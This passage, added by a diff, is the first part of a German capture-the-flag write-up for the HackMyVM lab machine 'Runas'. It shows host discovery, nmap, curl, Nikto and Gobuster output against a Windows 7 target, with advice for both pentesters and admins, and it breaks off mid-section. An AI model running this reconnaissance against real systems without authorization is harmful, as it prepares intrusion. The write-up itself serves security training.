@@ -1,0 +1,1035 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Runas - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Runas - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">CrackStation</div>
+                <div class="tool-item">xfreerdp3</div>
+                <div class="tool-item">cmdkey</div>
+                <div class="tool-item">runas</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc-admin">Proof of Concept: Erlangen des Administrator-Zugriffs</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Als ersten Schritt meiner Erkundung im Zielnetzwerk nutzte ich das Tool arp-scan, um aktive Hosts in meinem lokalen Subnetz zu entdecken. Der Befehl <code>arp-scan -l</code> sendet ARP-Anfragen an alle Adressen im lokalen Netzwerk und zeigt die Antworten an. Die Ausgabe zeigt einen aktiven Host unter der IP-Adresse <span class="command">192.168.2.67</span> mit der MAC-Adresse <span class="command">08:00:27:4f:41:93</span>, die dem Anbieter <span class="command">PCS Systemtechnik GmbH</span> zugewiesen ist. Dies identifiziert eindeutig das Zielsystem im Netzwerk.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der ARP-Scan ist eine sehr schnelle und zuverlässige Methode zur Host-Erkennung im lokalen Broadcast-Segment. Das Ergebnis liefert die notwendige IP-Adresse, um mit detaillierteren Scans auf dem Ziel fortzufahren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne lokale Netzwerktests immer mit einer schnellen Host-Erkennung wie arp-scan, um das Ziel zu lokalisieren.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere Network Access Control (NAC) oder Netzwerksegmentierung, um die unkontrollierte Host-Erkennung im lokalen Netzwerk zu erschweren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.67	08:00:27:4f:41:93	PCS Systemtechnik GmbH</span> 
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die IP-Adresse 192.168.2.67 identifiziert wurde, habe ich den Hostnamen &#x27;runas.hmv&#x27; zu meiner lokalen /etc/hosts Datei hinzugefügt. Dies ermöglicht mir, den Host zukünftig über seinen Namen statt über die IP-Adresse anzusprechen, was die Befehle oft lesbarer macht und in einigen Szenarien notwendig sein kann (z.B. bei vhost-basierten Webanwendungen). Die Information &quot;hosts 192.168.2.67 runas.hmv&quot; dokumentiert diesen Schritt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Anpassen der hosts-Datei ist Standardpraxis für Pentests, um die Verwaltung von Zielsystemen zu vereinfachen. Es ist ein kleiner, aber notwendiger Schritt für eine effiziente weitere Vorgehensweise.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Halte deine /etc/hosts-Datei für aktive Ziele auf dem neuesten Stand.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass interne Hostnamen nicht über leicht abfragbare externe Dienste oder Lecks öffentlich werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+hosts
+<span class="command">192.168.2.67   runas.hmv</span> 
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führe einen schnellen Nmap-Scan auf dem gefundenen Host 192.168.2.67 durch, um nur die offenen TCP-Ports zu identifizieren. Dies gibt mir einen schnellen Überblick über die primären Dienste, die auf dem Zielsystem laufen. Ich sehe mehrere offene Ports, darunter prominente Dienste wie <span class="command">80/tcp (http)</span>, <span class="command">139/tcp (netbios-ssn)</span>, <span class="command">445/tcp (microsoft-ds)</span> und <span class="command">3389/tcp (tcpwrapped - wahrscheinlich RDP)</span>, sowie MSRPC-Ports und einen weiteren HTTP-Dienst auf Port <span class="command">5357/tcp</span>. Das sind viele potenzielle Angriffsvektoren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine Vielzahl offener Ports bietet eine große Angriffsfläche. HTTP (80), SMB/NetBIOS (139, 445) und RDP (3389) auf einem Windows-System sind sehr interessante Ziele, die oft Schwachstellen für anonymen Zugriff, Dateifreigaben, Dienst-Enumeration oder Brute-Force aufweisen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Priorisiere die Enumeration und Untersuchung von Standarddiensten wie HTTP, SMB/NetBIOS und RDP. Achte auf die angezeigten Versionen für bekannte Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Schließe alle nicht benötigten Ports. Stelle sicher, dass Standarddienste korrekt konfiguriert und abgesichert sind (z.B. SMB-Signierung erforderlich, SMBv1 deaktiviert, RDP nur mit starker Authentifizierung und evtl. Network Level Authentication (NLA)). Implementiere eine Firewall, die den Zugriff auf diese Ports nur von vertrauenswürdigen Hosts erlaubt.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">80/tcp</span>    <span class="password">open</span>  <span class="command">http</span>         <span class="command">Apache httpd 2.4.57 ((Win64) PHP/7.2.0)</span>
+<span class="command">135/tcp</span>   <span class="password">open</span>  <span class="command">msrpc</span>        <span class="command">Microsoft Windows RPC</span>
+<span class="command">139/tcp</span>   <span class="password">open</span>  <span class="command">netbios-ssn</span>  <span class="command">Microsoft Windows netbios-ssn</span>
+<span class="command">445/tcp</span>   <span class="password">open</span>  <span class="command">microsoft-ds</span> <span class="command">Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span>
+<span class="command">3389/tcp</span>  <span class="password">open</span>  <span class="command">tcpwrapped</span>
+<span class="command">5357/tcp</span>  <span class="password">open</span>  <span class="command">http</span>         <span class="command">Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="command">49152/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>        <span class="command">Microsoft Windows RPC</span>
+<span class="command">49153/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>        <span class="command">Microsoft Windows RPC</span>
+<span class="command">49154/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>        <span class="command">Microsoft Windows RPC</span>
+<span class="command">49155/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>        <span class="command">Microsoft Windows RPC</span>
+<span class="command">49156/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>        <span class="command">Microsoft Windows RPC</span>
+<span class="command">49158/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>        <span class="command">Microsoft Windows RPC</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führe einen umfassenden Nmap-Scan mit Dienst- und Betriebssystemerkennung sowie Standard-Skripten durch (<code>-sS -sC -sV -p- -T5</code>). Die Ausgabe liefert sehr detaillierte Informationen zu allen offenen Ports, den erkannten Diensten inklusive Versionen und zusätzlichen Details durch die Skripte. Bestätigt werden die offenen Ports 80 (HTTP), 135 (MSRPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP) und 5357 (HTTP), sowie die höheren MSRPC-Ports. Besonders interessant sind:
+                <ul>
+                    <li>HTTP (Port 80): <span class="command">Apache httpd 2.4.57 ((Win64) PHP/7.2.0)</span>. Das <code>http-title</code> ist <span class="command">Index of /</span>, was auf Directory Listing hindeutet. Der Server-Header bestätigt <span class="command">Apache/2.4.57 (Win64) PHP/7.2.0</span>. Das <code>http-methods</code> Skript zeigt <span class="command">OPTIONS, HEAD, GET, POST, TRACE</span> als erlaubt.</li>
+                    <li>RDP (Port 3389): Erkannt als <span class="command">ssl/ms-wbt-server</span>. Das <code>rdp-ntlm-info</code> Skript liefert wertvolle Informationen: <span class="command">Target_Name: RUNAS-PC</span>, <span class="command">NetBIOS_Domain_Name: RUNAS-PC</span>, <span class="command">NetBIOS_Computer_Name: RUNAS-PC</span>. Die Produktversion ist <span class="command">6.1.7601</span> (Windows 7 SP1).</li>
+                    <li>SMB (Port 445): <span class="command">Windows 7 Professional 7601 Service Pack 1</span>. Das <code>smb-security-mode</code> zeigt <span class="command">message signing: disabled (dangerous, but default)</span>.</li>
+                </ul>
+                Die OS-Erkennung schätzt das System als <span class="command">Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1</span> ein, die CPEs bestätigen Windows 7. Die <code>TRACEROUTE</code> Informationen sind ebenfalls vorhanden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der detaillierte Nmap-Scan lieferte kritische Informationen. Der Apache Webserver mit Directory Listing und alter PHP-Version ist ein vielversprechender Vektor für den Initial Access (Web). RDP auf Port 3389 ist ebenfalls offen und liefert den Computernamen, was für Brute-Force-Angriffe oder die Nutzung gefundener Anmeldedaten relevant ist. Die fehlende SMB-Signierung ist eine weitere Schwachstelle, aber Web und RDP scheinen direktere Wege zu bieten. Die erlaubte TRACE Methode auf dem Webserver ist potenziell ausnutzbar (XST).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Web-Enumeration (Directory Listing, PHP-Schwachstellen) und RDP (Brute-Force, Nutzung gefundener Anmeldedaten). Untersuche die erlaubte TRACE-Methode. Nutze die SMB-Informationen für weitere Enumeration.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere Directory Listing auf Webservern. Halte Webserver-Software (Apache, PHP) aktuell und konfiguriere sie sicher. Deaktiviere die TRACE-Methode. Sichere RDP-Zugriff (starke Passwörter, NLA, Firewall). Aktiviere SMB-Signierung und deaktiviere SMBv1. Halte das Betriebssystem aktuell.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-29 21:04 CEST
+Nmap scan report for <span class="command">runas.hmv (192.168.2.67)</span>
+Host is up (<span class="command">0.00013s latency</span>).
+Not shown: 65523 closed tcp ports (reset)
+PORT      STATE SERVICE            VERSION
+<span class="command">80/tcp</span>    <span class="password">open</span>  <span class="command">http</span>               <span class="command">Apache httpd 2.4.57 ((Win64) PHP/7.2.0)</span>
+|_<span class="command">http-title: Index of /</span>
+|_<span class="command">http-server-header: Apache/2.4.57 (Win64) PHP/7.2.0</span>
+| <span class="command">http-methods:</span> 
+|_  <span class="password">Potentially risky methods: TRACE</span>
+<span class="command">135/tcp</span>   <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">139/tcp</span>   <span class="password">open</span>  <span class="command">netbios-ssn</span>        <span class="command">Microsoft Windows netbios-ssn</span>
+<span class="command">445/tcp</span>   <span class="password">open</span>  <span class="command">microsoft-ds</span>       <span class="command">Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span>
+<span class="command">3389/tcp</span>  <span class="password">open</span>  <span class="command">ssl/ms-wbt-server?</span>
+| <span class="command">rdp-ntlm-info:</span> 
+|   <span class="command">Target_Name: RUNAS-PC</span>
+|   <span class="command">NetBIOS_Domain_Name: RUNAS-PC</span>
+|   <span class="command">NetBIOS_Computer_Name: RUNAS-PC</span>
+|   <span class="command">DNS_Domain_Name: runas-PC</span>
+|   <span class="command">DNS_Computer_Name: runas-PC</span>
+|   <span class="command">Product_Version: 6.1.7601</span>
+|_  <span class="command">System_Time: 2025-06-29T19:05:50+00:00</span>
+|_<span class="command">ssl-date: 2025-06-29T19:05:55+00:00; +3s from scanner time.</span>
+| <span class="command">ssl-cert: Subject: commonName=runas-PC</span>
+| <span class="command">Not valid before: 2025-06-28T18:59:57</span>
+|_<span class="command">Not valid after:  2025-12-28T18:59:57</span>
+<span class="command">5357/tcp</span>  <span class="password">open</span>  <span class="command">http</span>               <span class="command">Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+|_<span class="command">http-server-header: Microsoft-HTTPAPI/2.0</span>
+|_<span class="command">http-title: Service Unavailable</span>
+<span class="command">49152/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49153/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49154/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49155/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49156/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+<span class="command">49158/tcp</span> <span class="password">open</span>  <span class="command">msrpc</span>              <span class="command">Microsoft Windows RPC</span>
+MAC Address: <span class="command">08:00:27:4F:41:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Microsoft Windows 2008|7|Vista|8.1</span>
+<span class="command">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1</span>
+<span class="command">OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1</span>
+Network Distance: <span class="command">1 hop</span>
+Service Info: <span class="command">Host: RUNAS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+Host script results:
+| <span class="command">smb2-time:</span> 
+|   <span class="command">date: 2025-06-29T19:05:50</span>
+|_  <span class="command">start_date: 2025-06-29T18:59:57</span>
+|_<span class="command">clock-skew: mean: -35m57s, deviation: 1h20m29s, median: 2s</span>
+| <span class="command">smb2-security-mode:</span> 
+|   <span class="command">2:1:0:</span> 
+|_    <span class="command">Message signing enabled but not required</span>
+| <span class="command">smb-os-discovery:</span> 
+|   <span class="command">OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span>
+|   <span class="command">OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span>
+|   <span class="command">Computer name: runas-PC</span>
+|   <span class="command">NetBIOS computer name: RUNAS-PC\x00</span>
+|   <span class="command">Workgroup: WORKGROUP\x00</span>
+|_  <span class="command">System time: 2025-06-29T22:05:50+03:00</span>
+| <span class="command">smb-security-mode:</span> 
+|   <span class="command">account_used: &lt;blank&gt;</span>
+|   <span class="command">authentication_level: user</span>
+|   <span class="command">challenge_response: supported</span>
+|_  <span class="password">message_signing: disabled (dangerous, but default)</span>
+|_<span class="command">nbstat: NetBIOS name: RUNAS-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:4f:41:93 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+<span class="command">1   0.12 ms runas.hmv (192.168.2.67)</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Hier die Web Enumeration-Schritte einfügen -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem Nmap-Scan, der anzeigte, dass die HTTP-Methoden OPTIONS, HEAD, GET, POST, TRACE auf Port 80 erlaubt sind, nutze ich die Nmap-Skriptausgabe, um dies zu bestätigen. Die hier gezeigte Ausgabe listet genau diese Methoden als erlaubt auf (<code>Allow: OPTIONS, HEAD, GET, POST, TRACE</code>). Die Kenntnis der erlaubten Methoden ist wichtig für die Web-Enumeration und das Testen auf Schwachstellen wie Cross-Site Tracing (XST) oder die Verfügbarkeit von POST-Endpunkten für Datei-Uploads oder Befehlsausführung. Die erlaubte TRACE-Methode wird später von Nikto als potenziell riskant markiert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Auflistung der erlaubten HTTP-Methoden ist Standardpraxis. Die erlaubte TRACE-Methode ist potenziell interessant, da sie auf Cross-Site Tracing (XST) Schwachstellen hindeuten kann, obwohl dies in modernen Browsern und Konfigurationen seltener ausnutzbar ist. Die erlaubte POST-Methode ist entscheidend für die Interaktion mit Webformularen oder zum Senden von Daten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfe immer die erlaubten HTTP-Methoden mit Tools wie <code>curl -X OPTIONS</code>, Nmap-Skripten oder Web-Proxys. Suche nach potenziell unsicheren Methoden wie TRACE, PUT, DELETE.
+                <br><strong>Empfehlung (Admin):</strong> Erlaube auf Webservern nur die minimal notwendigen HTTP-Methoden. Deaktiviere Methoden wie TRACE, PUT, DELETE, es sei denn, sie werden explizit und sicher benötigt. Konfiguriere den Webserver so, dass bei nicht erlaubten Methoden korrekt mit 405 Method Not Allowed geantwortet wird.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Allow: <span class="command">OPTIONS,HEAD,GET,POST,TRACE</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich überprüfe die Standard-Webseite auf Port 80 mit <code>curl -Iv http://192.168.2.67</code>. Der Befehl sendet einen HEAD-Request, um die Header und den Statuscode zu erhalten. Die Ausgabe zeigt einen <span class="password">HTTP/1.1 200 OK</span> Status und bestätigt den <span class="command">Server: Apache/2.4.57 (Win64) PHP/7.2.0</span>. Der Content-Type ist <span class="command">text/html;charset=UTF-8</span>.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Bestätigung, dass der Webserver auf Port 80 läuft und zugänglich ist, sowie die Identifizierung der spezifischen Software (Apache, PHP) und deren Versionen sind entscheidend. Apache 2.4.57 und insbesondere PHP 7.2.0 sind ältere Versionen, für die es wahrscheinlich bekannte Schwachstellen gibt. Das Directory Listing, das Nmap vermutet hat, ist ebenfalls ein wichtiger Hinweis.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Identifiziere immer die genaue Webserver-Software und -Version sowie verwendete Web-Technologien. Nutze Tools wie <code>curl -I</code>, Wappalyzer oder OWASP ZAP. Recherchiere bekannte Schwachstellen für die identifizierte Software und Versionen (Apache 2.4.57, PHP 7.2.0).
+                <br><strong>Empfehlung (Admin):</strong> Halte Webserver-Software und PHP auf dem neuesten Stand. Entferne oder ändere Server-Header, um Informationen über die verwendete Software zu reduzieren. Deaktiviere Directory Listing.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+*   Trying 192.168.2.67:80...
+* <span class="password">Connected to 192.168.2.67 (192.168.2.67) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.67
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; <span class="command">Date: Sun, 29 Jun 2025 19:06:22 GMT</span>
+Date: Sun, 29 Jun 2025 19:06:22 GMT
+&lt; <span class="command">Server: Apache/2.4.57 (Win64) PHP/7.2.0</span>
+Server: Apache/2.4.57 (Win64) PHP/7.2.0
+&lt; <span class="command">Content-Type: text/html;charset=UTF-8</span>
+Content-Type: text/html;charset=UTF-8
+&lt; 
+
+* <span class="password">Connection #0 to host 192.168.2.67 left intact</span>   
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich nutze das automatisierte Web-Schwachstellen-Scan-Tool Nikto gegen Port 80. Die Ausgabe best&auml;tigt die <span class="command">Apache/2.4.57 (Win64) PHP/7.2.0</span> Version. Nikto meldet mehrere Probleme: Fehlende Sicherheits-Header (<span class="password">X-Frame-Options</span>, <span class="password">X-Content-Type-Options</span>), <span class="password">Directory indexing found</span> (best&auml;tigt Nmap), <span class="password">PHP/7.2.0 appears to be outdated</span>, erlaubte Methoden einschlie&szlig;lich <span class="command">TRACE</span> (potenziell anf&auml;llig f&uuml;r XST), und verschiedene Varianten von Pfaden (<code>/./</code>, <code>//</code>, <code>/%2e/</code> etc.), die ebenfalls zu <span class="password">Directory indexing</span> f&uuml;hren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto lieferte entscheidende Best&auml;tigungen und neue Informationen. Das Directory Listing ist eine schwerwiegende Schwachstelle, die das Durchsuchen des Web-Root-Verzeichnisses erm&ouml;glicht. Die veraltete PHP-Version ist ebenfalls kritisch und sollte auf bekannte Schwachstellen gepr&uuml;ft werden. Die erlaubte TRACE-Methode ist weniger kritisch, aber bemerkenswert. Die vielen Treffer f&uuml;r Directory Indexing &uuml;ber verschiedene Pfadmanipulationen zeigen, dass die Konfiguration anf&auml;llig ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Directory Listing aus, um Dateien und Verzeichnisse zu finden. Suche nach Konfigurationsdateien, Backup-Dateien oder potenziellen Schwachstellen im Code, wenn Quellcode verf&uuml;gbar ist. Recherchiere Exploits f&uuml;r PHP 7.2.0.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere Directory Listing vollst&auml;ndig. Halte PHP aktuell. Stelle sicher, dass alle notwendigen Sicherheits-Header gesetzt sind. Deaktiviere die TRACE-Methode.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.67</span>
++ Target Hostname:    <span class="command">192.168.2.67</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-06-29 21:07:05 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.57 (Win64) PHP/7.2.0</span>
++ /: The <span class="password">anti-clickjacking X-Frame-Options header is not present</span>. See: [Link: X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ /: The <span class="password">X-Content-Type-Options header is not set</span>. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: missing-content-type-header | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ /: <span class="password">Directory indexing found</span>.
++ /index.php?: Retrieved <span class="command">x-powered-by header: PHP/7.2.0</span>.
++ <span class="password">PHP/7.2.0 appears to be outdated</span> (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
++ OPTIONS: <span class="command">Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE</span> .
++ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: [Link: Cross_Site_Tracing | Ziel: https://owasp.org/www-community/attacks/Cross_Site_Tracing]
++ <span class="command">/./</span>: <span class="password">Directory indexing found</span>.
++ <span class="command">/./</span>: Appending &#x27;/./&#x27; to a directory allows indexing.
++ <span class="command">//</span>: <span class="password">Directory indexing found</span>.
++ <span class="command">//</span>: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
++ <span class="command">/%2e/</span>: <span class="password">Directory indexing found</span>.
++ <span class="command">/%2e/</span>: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. See: [Link: http://www.securityfocus.com/bid/2513 | Ziel: http://www.securityfocus.com/bid/2513]
++ <span class="command">///</span>: <span class="password">Directory indexing found</span>.
++ <span class="command">/?PageServices</span>: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via &#x27;open directory browsing&#x27;. Web Publisher should be disabled. See: [Link: CVE-1999-0269 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269]
++ <span class="command">/?wp-cs-dump</span>: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via &#x27;open directory browsing&#x27;. Web Publisher should be disabled. See: [Link: CVE-1999-0269 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269]
++ <span class="command">//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span>: <span class="password">Directory indexing found</span>.
++ <span class="command">//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span>: Abyss 1.03 reveals directory listing when multiple /&#x27;s are requested. See: [Link: CVE-2002-1078 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078]
++ <span class="command">8908 requests</span>: <span class="command">0 error(s) and 18 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-06-29 21:07:41 (GMT2) (36 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende Gobuster, um Verzeichnisse und Dateien auf dem Webserver auf Port 80 zu enumerieren. Ich nutze eine gängige Wortliste (directory-list-2.3-medium.txt) und eine breite Palette von Dateierweiterungen. Die Ausgabe zeigt, dass <code>index.php</code> existiert (Status 200) und dass der Server Case-Insensitive bei diesem spezifischen Dateinamen ist (Treffer für <code>index.php</code>, <code>Index.php</code>, <code>INDEX.php</code>). Dies best&auml;tigt die prim&auml;re Seite und gibt einen kleinen Hinweis auf das Systemverhalten. Au&szlig;er <code>index.php</code> wurden keine weiteren signifikanten Verzeichnisse oder Dateien mit dieser Standard-Wortliste gefunden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Gobuster-Ergebnis ist weniger aufschlussreich als die Nikto-Ergebnisse. Es best&auml;tigt lediglich <code>index.php</code> und dessen Case-Insensitivity. Die wahre Web-Schwachstelle scheint Directory Listing und die alte PHP-Version zu sein, wie Nikto nahelegt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kombiniere verschiedene Web-Enumerationstools. Wenn Standard-Wortlisten nicht viel finden, erstelle angepasste Wortlisten oder nutze andere Techniken wie LFI-Fuzzing, wenn Hinweise darauf gefunden werden (wie hier der `file` Parameter).
+                <br><strong>Empfehlung (Admin):</strong> Siehe allgemeine Empfehlungen zur Web-Härtung.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.67</span>
+[+] Method:                  <span class="command">GET</span>
+[+] Threads:                 <span class="command">10</span>
+[+] Wordlist:                <span class="command">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   <span class="command">503,404,403</span>
+[+] User Agent:              <span class="command">gobuster/3.6</span>
+[+] Extensions:              <span class="command">tar,pl,pdf,json,doc,aspx,ps1,svg,asp,png,rtf,config,desc,rpm,pHtml,raw,ln,txt,c,diff,db,icon,jpg,pem,crt,ELF,sql,bat,py,kdbx,lib,rar,docx,accdb,gz,xml,xlsx,elf,deb,pub,old,zip,java,cgi,exp,csv,dll,xls,sh,html,php,phtml,js.map,mod,exe,jpeg,conf,eps,mdb,bak,csh</span>
+[+] Expanded:                <span class="command">true</span>
+[+] Timeout:                 <span class="command">10s</span>
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.67/index.php</span>            <span class="password">(Status: 200)</span> <span class="command">[Size: 414]</span>
+<span class="command">http://192.168.2.67/Index.php</span>            <span class="password">(Status: 200)</span> <span class="command">[Size: 414]</span>
+<span class="command">http://192.168.2.67/INDEX.php</span>            <span class="password">(Status: 200)</span> <span class="command">[Size: 414]</span>
+Progress: <span class="command">13673976 / 13674038 (100.00%)</span>
+===============================================================
+<span class="password">Finished</span>
+=============================================================== 
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
